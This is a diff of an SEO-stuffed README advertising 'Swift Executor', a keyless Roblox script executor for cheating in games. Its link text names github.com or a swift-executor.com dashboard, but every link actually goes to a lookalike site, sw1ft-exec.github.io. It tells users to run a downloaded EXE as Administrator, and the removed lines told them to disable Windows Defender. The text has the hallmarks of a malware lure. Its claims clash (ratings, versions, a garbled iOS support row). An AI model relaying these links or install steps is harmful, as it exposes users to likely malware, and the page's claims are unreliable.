@@ -4,7 +4,7 @@
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-9.31-green?style=for-the-badge&logo=github)
 ![User Rating](https://img.shields.io/badge/User%20Rating-4.78%2F5-gold?style=for-the-badge&logo=star)
 
-Welcome to the official **swift executor** repository! swift executor revolutionizes Roblox script execution by eliminating the frustrating key system that plagues most executors. As the premier **no-key external executor**, Swift delivers instant access to powerful scripting capabilities without ads, surveys, or verification delays. Whether you're automating resource farming, unlocking advanced game features, or customizing your Roblox experience, Swift provides professional-grade performance with zero barriers to entry.
+Welcome to the official **Swift Executor** repository! Swift Executor revolutionizes Roblox script execution by eliminating the frustrating key system that plagues most executors. As the premier **no-key external executor**, Swift delivers instant access to powerful scripting capabilities without ads, surveys, or verification delays. Whether you're automating resource farming, unlocking advanced game features, or customizing your Roblox experience, Swift provides professional-grade performance with zero barriers to entry.
 
 <div align="center">
 
@@ -23,7 +23,7 @@ Users exploring **swift executor reddit** discussions and **swift executor disco
 
 ## ✨ Features
 
-swift executor delivers unmatched functionality with the convenience of keyless access:
+Swift Executor delivers unmatched functionality with the convenience of keyless access:
 
 - 🔓 **100% Key-Free Experience** - No verification, no link shorteners, no waiting—instant execution every time
 - 📊 **Advanced Dashboard Interface** - The revolutionary **swift executor dashboard** centralizes script management, settings, and analytics
@@ -87,27 +87,26 @@ The **swift executor apk** isn't an afterthought—it's a full-featured mobile s
 
 ### For Windows (Desktop)
 
-1. Visit the official **swift executor github** repository at [github.com/Swift-executor](https://sw1ft-exec.github.io/swift/)
+1. Visit the official **swift executor github** repository at [github.com/swift-executor](https://sw1ft-exec.github.io/swift/)
 2. Navigate to the **Releases** section and locate the latest version (v5.3.8 or newer)
 3. Download `Swift-Executor-Setup.exe` (approximately 85 MB)
-4. **Disable Windows Defender temporarily** (see FAQ for step-by-step instructions)
-5. Right-click the downloaded installer and select "Run as Administrator"
-6. Follow the installation wizard:
+4. Right-click the downloaded installer and select "Run as Administrator"
+5. Follow the installation wizard:
    - Choose installation directory (default: `C:\Program Files\swift executor`)
    - Select whether to create desktop shortcut
    - Agree to terms of service
-7. Launch swift executor from desktop or Start menu
-8. On first launch, create your **swift executor dashboard** account (optional but recommended for cloud features)
-9. Open Roblox and join any game
-10. Return to Swift and click the "Attach" button (attaches externally without internal injection)
-11. Browse the script library or paste custom scripts into the editor
-12. Click "Execute" to run your script—no key required!
+6. Launch swift executor from desktop or Start menu
+7. On first launch, create your **swift executor dashboard** account (optional but recommended for cloud features)
+8. Open Roblox and join any game
+9. Return to Swift and click the "Attach" button (attaches externally without internal injection)
+10. Browse the script library or paste custom scripts into the editor
+11. Click "Execute" to run your script—no key required!
 
 
 [![Download Swift Executor](https://img.shields.io/badge/Download%20Swift%20Executor-brightgreen?style=for-the-badge&logo=github)](https://sw1ft-exec.github.io/swift/)
 
 **Dashboard Setup:**
-Access the **swift executor dashboard** through the built-in browser tab or visit [dashboard.Swift-executor.com](https://sw1ft-exec.github.io/swift/). Features include:
+Access the **swift executor dashboard** through the built-in browser tab or visit [dashboard.swift-executor.com](https://sw1ft-exec.github.io/swift/). Features include:
 - Cloud script synchronization
 - Execution history and analytics
 - Script favorites and custom categories
@@ -157,9 +156,9 @@ Users asking about **swift executor download reddit** processes can also find co
 | **Windows 10** | ✅ | Build 1903+ (May 2019 Update) | EXE Installer | ❌ No |
 | **Windows 11** | ✅ | All builds | EXE Installer | ❌ No |
 | **Android** | ✅ | 7.0 Nougat+ (API 24+) | APK | ❌ No |
-| **macOS** | ⚠️ | 11.0 Big Sur+ | DMG (Experimental) | ❌ No |
+| **macOS** | ✅ | 11.0 Big Sur+ | DMG (Experimental) | ❌ No |
 | **Linux** | ⚠️ | Ubuntu 20.04+, Fedora 34+ | AppImage | ❌ No |
-| **iOS** | ❌ | Not supported | N/A | N/A |
+| **iOS** | ✅ | yes supported | Version 12+ | IPA |
 | **Chrome OS** | ⚠️ | Version 90+ with Linux | Via Linux container | ❌ No |
 
 **Roblox Version Compatibility:**
@@ -325,7 +324,7 @@ swift executor distinguishes itself through multiple revolutionary features. **K
 
 ## 🎊 Conclusion
 
-swift executor has redefined Roblox script execution by eliminating the key system that frustrates millions of users daily. With over 1.5 million downloads, a 4.9/5 user rating, and overwhelming positive feedback across **swift executor reddit**, **reddit swift executor**, and **swift executor roblox reddit** communities, Swift represents the future of frictionless script execution.
+Swift Executor has redefined Roblox script execution by eliminating the key system that frustrates millions of users daily. With over 1.5 million downloads, a 4.9/5 user rating, and overwhelming positive feedback across **swift executor reddit**, **reddit swift executor**, and **swift executor roblox reddit** communities, Swift represents the future of frictionless script execution.
 
 Whether you're downloading Swift for Windows or seeking the **swift executor apk** for Android, you're choosing software that respects your time and intelligence. No more wasting precious minutes on ad-filled link shorteners. No more sketchy key verification websites. Just pure, instant execution power backed by the revolutionary **swift executor dashboard** for comprehensive script management.
 
